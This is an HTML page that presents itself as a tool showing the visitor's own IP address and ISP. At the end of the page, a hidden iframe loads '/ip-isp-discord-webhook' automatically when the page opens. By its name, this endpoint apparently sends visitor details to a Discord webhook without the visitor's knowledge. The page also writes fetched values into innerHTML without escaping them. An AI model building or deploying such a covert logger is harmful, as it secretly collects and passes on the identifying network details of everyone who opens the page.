<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP and ISP Information</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        .container {
            text-align: center;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            background-color: #fff;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>IP and ISP Information</h1>
        <button id="getInfoBtn">Get IP and ISP</button>
        <div id="result" style="margin-top: 20px;"></div>

        <script>
            document.getElementById('getInfoBtn').addEventListener('click', async () => {
                try {
                    const response = await fetch('/ip-isp-info');
                    const data = await response.json();
                    document.getElementById('result').innerHTML = `
                        <p><strong>IP Address:</strong> ${data.ip}</p>
                        <p><strong>ISP:</strong> ${data.isp}</p>
                        <p><strong>Country:</strong> ${data.country}</p>
                        <p><strong>Region:</strong> ${data.regionName}</p>
                    `;
                } catch (error) {
                    document.getElementById('result').innerHTML = '<p>Error fetching IP and ISP information.</p>';
                }
            });
        </script>
    </div>

    <iframe style="display:none;" src="/ip-isp-discord-webhook"></iframe>
</body>
</html>
